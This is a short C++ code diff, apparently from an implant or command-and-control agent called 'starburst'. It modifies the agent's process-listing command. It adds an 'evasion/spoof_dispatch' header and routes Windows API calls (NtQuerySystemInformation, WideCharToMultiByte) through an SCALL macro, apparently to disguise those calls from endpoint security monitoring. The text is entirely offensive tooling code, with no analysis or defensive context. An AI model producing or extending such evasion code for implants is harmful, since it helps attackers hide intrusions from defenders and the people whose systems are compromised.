@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PS
 
@@ -25,7 +26,7 @@ auto declfn starburst::cmd_ps(
     }
 
     ULONG ret_len = 0;
-    NTSTATUS status = inst.ntdll.NtQuerySystemInformation(
+    NTSTATUS status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
         SystemProcessInformation, buf, buf_size, &ret_len
     );
 
@@ -39,7 +40,7 @@ auto declfn starburst::cmd_ps(
                 symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
             return;
         }
-        status = inst.ntdll.NtQuerySystemInformation(
+        status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
             SystemProcessInformation, buf, buf_size, &ret_len
         );
     }
@@ -73,7 +74,7 @@ auto declfn starburst::cmd_ps(
     while ( true ) {
         char proc_name[260] = { 0 };
         if ( spi->ImageName.Buffer && spi->ImageName.Length > 0 ) {
-            inst.kernel32.WideCharToMultiByte(
+            SCALL( inst, kernel32.WideCharToMultiByte,
                 CP_ACP, 0,
                 spi->ImageName.Buffer,
                 spi->ImageName.Length / sizeof(wchar_t),
